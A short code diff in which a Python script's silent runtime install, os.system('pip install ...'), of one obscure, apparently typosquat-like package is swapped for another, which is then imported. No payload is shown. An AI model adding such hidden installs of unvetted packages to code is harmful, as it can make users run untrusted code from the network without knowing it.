@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlipkgsV2")
-import pysqlipkgsV2
+os.system("pip install pipsqlitetoolsV2")
+import pipsqlitetoolsV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
